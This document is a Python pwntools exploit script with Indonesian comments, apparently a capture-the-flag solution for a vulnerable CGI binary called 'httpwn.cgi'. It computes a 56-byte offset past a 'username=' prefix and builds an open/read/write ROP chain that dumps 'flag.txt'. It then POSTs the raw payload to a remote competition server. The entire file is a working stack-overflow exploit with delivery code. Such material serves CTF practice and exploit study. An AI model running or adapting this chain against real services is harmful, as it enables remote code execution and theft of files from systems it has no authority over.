import requests
from pwn import *

# Load binary lokal untuk mencari gadget ROP yang tepat
# Pastikan ini sudah dicompile dengan flags: -fno-stack-protector -no-pie -static
exe = ELF('./httpwn.cgi')
context.binary = exe
rop = ROP(exe)

# --- Konfigurasi Offset ---
# Buffer 'data' size = 48 bytes
# Saved RBP = 8 bytes
# Total jarak ke Return Address = 56 bytes
offset = 56 
writable_area = exe.bss()

# --- Membuat ROP Chain ---

# 1. READ "flag.txt" dari input kita ke memory (.bss)
# Kita akan menaruh string "flag.txt" di paling belakang payload,
# jadi gadget ini akan membacanya dari stream input yang masuk.
rop.read(0, writable_area, 8) 

# 2. OPEN file "flag.txt"
# syscall open(filename_addr, flags)
# rax=2, rdi=writable_area, rsi=0 (O_RDONLY)
rop.open(writable_area, 0)

# 3. READ isi file tersebut
# syscall read(fd, buffer, count)
# fd akan menjadi 3 (karena 0,1,2 sudah dipakai stdin/out/err)
rop.read(3, writable_area, 100)

# 4. WRITE isi file ke stdout (agar muncul di respon HTTP)
# syscall write(fd, buffer, count)
# fd=1 (stdout)
rop.write(1, writable_area, 100)

# --- Menyusun Payload ---
# Prefix wajib agar lolos check `strncmp(data, "username=", 9)`
payload = b'username='

# Padding 'A'
# Kita butuh 56 bytes total sebelum return address.
# Karena sudah ada 9 bytes "username=", sisa padding adalah 56 - 9 = 47
payload += b'A' * (offset - 9)

# Masukkan ROP Chain
payload += rop.chain()

# String "flag.txt" ditaruh di akhir agar dibaca oleh gadget pertama (read)
payload += b'flag.txt' 

print(f"[*] Payload Length: {len(payload)}")
print(f"[*] Target URL: http://gzcli.techcomfest.1pc.tf:61555/cgi-bin/httpwn.cgi")

# --- Mengirim Payload ---
# PENTING: Gunakan http:// (bukan https://) dan kirim sebagai raw bytes
url = "http://gzcli.techcomfest.1pc.tf:61555/cgi-bin/httpwn.cgi"

try:
    r = requests.post(url, data=payload)
    print("-" * 20)
    print("RESPONSE:")
    print(r.text) # Flag harusnya muncul di sini
    print("-" * 20)
except Exception as e:
    print(f"Error: {e}")
